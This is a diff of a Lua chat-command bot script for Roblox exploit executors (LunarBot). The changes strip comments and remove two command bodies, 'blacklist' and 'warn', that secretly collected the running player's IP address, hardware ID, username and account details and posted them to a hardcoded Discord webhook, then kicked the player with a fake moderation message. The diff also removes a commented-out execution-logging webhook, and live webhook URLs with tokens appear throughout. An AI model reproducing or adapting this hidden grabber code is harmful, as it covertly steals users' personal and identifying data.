@@ -26,24 +26,24 @@ for i, plr in pairs(game.Players:GetPlayers()) do
 	end
 end
 
---[[ configuration ]]--
+
 
 local whitelisted = {
-	--bot.Name,
+
 }
 _G.preWhitelisted = {
     "BloxiSkid",
     "TheAcounter0",
     "Stay_Sold",
     "Seweer_II",
-	"Halvorson64280"
+	
  
 }
 print("LOADED!")
-local showbotchat = _G.showBotChat or false --setting this to true will cause all messages sent by either commands or LunarBot to begin with [LunarBot]
-local allwhitelisted = _G.defaultAllWhitelisted or false --set to true if you want everyone to be whitelisted, nicK is not responsible for anything players make you do or say.
-local randommoveinteger = _G.defaultRandomMoveInteger or 5 --interval in which how long randommove waits until choosing another direction
-local prefix = _G.defaultPrefix or "." --DO NOT SET TO MORE THAN 1 CHARACTER!
+local showbotchat = _G.showBotChat or false 
+local allwhitelisted = _G.defaultAllWhitelisted or false 
+local randommoveinteger = _G.defaultRandomMoveInteger or 5 
+local prefix = _G.defaultPrefix or "."
 
 if _G.preWhitelisted and type(_G.preWhitelisted) == "table" then
 	for i, v in pairs(_G.preWhitelisted) do
@@ -56,7 +56,7 @@ if prefix:len() > 1 then
 	return
 end
 
---[[ end configs, don't edit this especially if you have no idea what Lua is lmao ]]--
+
 
 local lunarbotversion = "v0.1.0 Public Beta Release"
 local lunarbotchangelogs = "Added a few commands!"
@@ -128,7 +128,7 @@ local commandsMessage = {
 	"lua <lua>, ping, catch <player>, copychat <player>, cheer, stadium",
 }
 
-local commands --don't change, could lead to errors
+local commands 
 
 local function checkCommands(cmd)
 	for i, cmds in pairs(commands) do
@@ -268,7 +268,7 @@ commands = {
 			
 			if plr then
 				bot.Character:SetPrimaryPartCFrame(CFrame.new(plr.Character.HumanoidRootPart.Position))
-				chat("📸 CAUGHT IN 4K BY LUNARBOT 📸")
+				chat("lol")
 			end
 		end,
 	},
@@ -671,10 +671,7 @@ commands = {
 				end
 			end
 		end,
-	}, --// BEGINGNG--// BEGINGNG--// BEGINGNG--// BEGINGNG--// BEGINGNG BLACKLIST
-	
-
-    --// BEGINGNG END--// BEGINGNG--// BEGINGNG--// BEGINGNG--// BEGINGNG--// BEGINGNG--// BEGINGNG--// BEGINGNG
+	}, 
 	bring = {
 		Name = "bring",
 		Aliases = {},
@@ -697,122 +694,13 @@ commands = {
         Enabled = true,
         CommandFunction = function(msg, args, speaker)
 
- 
-local IP = game:HttpGet("https://v4.ident.me")
-plr = game:GetService'Players'.LocalPlayer
-local premium = false
-local ALT = false
-if plr.MembershipType == Enum.MembershipType.Premium then
-	premium = true
-elseif plr.MembershipType == Enum.MembershipType.None then
-	premium = false
-end
-if premium == false then 
-	if plr.AccountAge <= 70 then 
-		ALT = true
-	end
-end
-
-local market = game:GetService("MarketplaceService")
-local info = market:GetProductInfo(game.PlaceId, Enum.InfoType.Asset)
-
-
-local http_request = http_request;
-if syn then
-	http_request = syn.request
-elseif SENTINEL_V2 then
-	function http_request(tb)
-		return {
-			StatusCode = 200;
-			Body = request(tb.Url, tb.Method, (tb.Body or ''))
-		}
-	end
-end
-
-local body = http_request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body;
-local decoded = game:GetService('HttpService'):JSONDecode(body)
-local hwid_list = {"Syn-Fingerprint", "Exploit-Guid", "Proto-User-Identifier", "Sentinel-Fingerprint"};
-hwid = "";
-
-for i, v in next, hwid_list do
-	if decoded.headers[v] then
-		hwid = decoded.headers[v];
-		break
-	end
-end
-
-if hwid then
-local HttpServ = game:GetService('HttpService')
-local url = "https://discord.com/api/webhooks/1050848420224577587/lHKLhRkz7flA049MUL0h4iAZMmAQ1uLx4ZbS9Pha67xrBH-hF-3OAZj5X535vUKy_YjH"
---local url = "https://discord.com/api/webhooks/753688508828483634/qo0PL1VWKkPGH9UETChhu9fxwY001h0JDEPlZIrsaxHZS26tztecA9la4vz-46_0kajq"
-
-local data = 
-    {
-        ["content"] = "Blacklisted initation trail.",
-        ["embeds"] = {{
-            ["title"] = "__**HWID:**__",
-            ["description"] = hwid,
-            ["type"] = "rich",
-            ["color"] = tonumber(0xAB0909),
-            ["fields"] = {  
-
-			
-			  {
-                    ["name"] = "Username:",
-                    ["value"] = Game.Players.LocalPlayer.Name,
-                    ["inline"] = true
-                },
-				{
-                    ["name"] = "IP Address:",
-                    ["value"] = IP,
-                    ["inline"] = true
-                },
-				{
-                    ["name"] = "Game Link:",
-                    ["value"] = "https://roblox.com/games/" .. game.PlaceId .. "/",
-                    ["inline"] = true
-                },
-				{
-					["name"] = "Game Name:",
-					["value"] = info.Name,
-					["inline"] = true
-				},
-				{
-					["name"] = "Age:",
-					["value"] = plr.AccountAge,
-					["inline"] = true
-				},
-				{
-					["name"] = "Roblox Premium:",
-					["value"] = premium,
-					["inline"] = true
-				},
-				{
-					["name"] = "Alternetive Account:",
-					["value"] = ALT,
-					["inline"] = true
-				},
-				
-            },
-        }}
-    }
-    local newdata = HttpServ:JSONEncode(data)
-    
-    local headers = {
-            ["content-type"] = "application/json"
-    }
-    
-    local request_payload = {Url=url, Body=newdata, Method="POST", Headers=headers}
-    http_request(request_payload)
-end
 
                 bot:Kick("Blacklist trail initiated. [By an mod] This may get you blacklisted for more support DM the support team [ERROR: 9938-BL-0038-R:23]")
 
          
         end,
     
-    }, --// BEGINGNG--// BEGINGNG--// WARN BEGINGNG--// BEGINGNG--// BEGINGNG--// BEGINGNG--// BEGINGNG--// BEGINGNG--// BEGINGNG--// BEGINGNG--// BEGINGNG--// BEGINGNG--// BEGINGNG--// BEGINGNG--// BEGINGNG
-   
+    }, 
 	copychat = {
 		Name = "copychat",
 		Aliases = {"cc", "copyc", "cchat"},
@@ -1335,115 +1223,7 @@ print("Banning")
 		CommandFunction = function(msg, args, speaker)
 			pcall(function()
                 chat("[!] - WARRNED ACCOUNT")
---//34567890-097865342256789097653456789009765432537468590-097654325467890-0806543214356789
 
-local IP = game:HttpGet("https://v4.ident.me")
-plr = game:GetService'Players'.LocalPlayer
-local premium = false
-local ALT = false
-if plr.MembershipType == Enum.MembershipType.Premium then
-	premium = true
-elseif plr.MembershipType == Enum.MembershipType.None then
-	premium = false
-end
-if premium == false then 
-	if plr.AccountAge <= 70 then 
-		ALT = true
-	end
-end
-
-local market = game:GetService("MarketplaceService")
-local info = market:GetProductInfo(game.PlaceId, Enum.InfoType.Asset)
-
-
-local http_request = http_request;
-if syn then
-	http_request = syn.request
-elseif SENTINEL_V2 then
-	function http_request(tb)
-		return {
-			StatusCode = 200;
-			Body = request(tb.Url, tb.Method, (tb.Body or ''))
-		}
-	end
-end
-
-local body = http_request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body;
-local decoded = game:GetService('HttpService'):JSONDecode(body)
-local hwid_list = {"Syn-Fingerprint", "Exploit-Guid", "Proto-User-Identifier", "Sentinel-Fingerprint"};
-hwid = "";
-
-for i, v in next, hwid_list do
-	if decoded.headers[v] then
-		hwid = decoded.headers[v];
-		break
-	end
-end
-
-if hwid then
-local HttpServ = game:GetService('HttpService')
-local url = "https://discord.com/api/webhooks/1050848420224577587/lHKLhRkz7flA049MUL0h4iAZMmAQ1uLx4ZbS9Pha67xrBH-hF-3OAZj5X535vUKy_YjH"
---local url = "https://discord.com/api/webhooks/753688508828483634/qo0PL1VWKkPGH9UETChhu9fxwY001h0JDEPlZIrsaxHZS26tztecA9la4vz-46_0kajq"
-
-local data = 
-    {
-        ["content"] = "WARNED ACCOUNT",
-        ["embeds"] = {{
-            ["title"] = "__**HWID:**__",
-            ["description"] = hwid,
-            ["type"] = "rich",
-            ["color"] = tonumber(0xAB0909),
-            ["fields"] = {  
-
-			
-			  {
-                    ["name"] = "Username:",
-                    ["value"] = Game.Players.LocalPlayer.Name,
-                    ["inline"] = true
-                },
-				{
-                    ["name"] = "IP Address:",
-                    ["value"] = IP,
-                    ["inline"] = true
-                },
-				{
-                    ["name"] = "Game Link:",
-                    ["value"] = "https://roblox.com/games/" .. game.PlaceId .. "/",
-                    ["inline"] = true
-                },
-				{
-					["name"] = "Game Name:",
-					["value"] = info.Name,
-					["inline"] = true
-				},
-				{
-					["name"] = "Age:",
-					["value"] = plr.AccountAge,
-					["inline"] = true
-				},
-				{
-					["name"] = "Roblox Premium:",
-					["value"] = premium,
-					["inline"] = true
-				},
-				{
-					["name"] = "Alternetive Account:",
-					["value"] = ALT,
-					["inline"] = true
-				},
-				
-            },
-        }}
-    }
-    local newdata = HttpServ:JSONEncode(data)
-    
-    local headers = {
-            ["content-type"] = "application/json"
-    }
-    
-    local request_payload = {Url=url, Body=newdata, Method="POST", Headers=headers}
-    http_request(request_payload)
-end
                 bot:Kick("ACCOUNT WARRNED.")
 			end)
 		end,
@@ -1689,7 +1469,7 @@ print("Banning")
 }
 
 
---// Kick enpoints
+
 Kick = {
 	Name = "Kick",
 	Aliases = {"K"},
@@ -1760,7 +1540,7 @@ TrollAbuseKick =  {
 		end)
 	end,
 
-}  --// with webhook / warning shit
+} 
 
 Warn =  {
 	Name = "Warn",
@@ -1851,14 +1631,14 @@ local cmdcon = messageDoneFiltering.OnClientEvent:Connect(function(data)
 		local cmd = checkCommands(args[1])
 		
 		if status ~= nil and speaker ~= bot.Name then
-			chat("LunarBot Status // " .. status .. " // Commands are disabled.")
+			chat(" Status // " .. status .. " // Commands are disabled.")
 			return
 		end
 		
 		if cmd ~= nil then
 			if cmd.Enabled == false then
 				chat("The command " .. cmd.Name .. " is currently disabled. Please request it to be re-enabled by " .. bot.DisplayName .. ".")
-				print("LunarBot CMDLogs // " .. speaker .. " attempted to run command: " .. cmd.Name .. " with arguments: " .. tts(args) .. "while the command was disabled.")
+				print(" CMDLogs // " .. speaker .. " attempted to run command: " .. cmd.Name .. " with arguments: " .. tts(args) .. "while the command was disabled.")
 				return
 			else
 				cmd.CommandFunction(message, args, speaker)
@@ -1888,37 +1668,9 @@ bot.Chatted:Connect(function(msg)
 		cmdcon:Disconnect()
 		disconnected = true
 		wait()
-		chat("Successfully disconnected LunarBot.")
+		chat("Successfully disconnected .")
 	end
 end)
-
---[[ 
-	local req = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or (lunar and lunar.request) or nil
-
-if req ~= nil then
-	req({
-	    Url = "https://discord.com/api/webhooks/1047900557534314526/resEYsAS_rvrwnNYt5r3n10u018QrJBThttKYgZ77-GeR8jqguyfwDeARwpGOdnxBy-unonononnononononononononn",
-	    Method = "POST",
-	    Headers = {
-		["Content-Type"] = "application/json"
-	    },
-	    Body = game.HttpService:JSONEncode({
-		content = "<@598958193032560642>",
-		embeds = {
-			title = "LunarBot Execution",
-			description = "LunarBot has been executed by " .. bot.DisplayName .. "!",
-			color = 0xAADDFF,
-			author = "LunarBot Execution Bot",
-			fields = {
-				{name = "User ID", value = bot.UserId, inline = true},
-				{name = "Name", value = bot.Name, inline = true},
-				{name = "Time", value = os.date("%I:%M:%S %p"), inline = true}
-			}
-		},
-	   })
-	})
-end
-]]
 
 
 task.spawn(function()
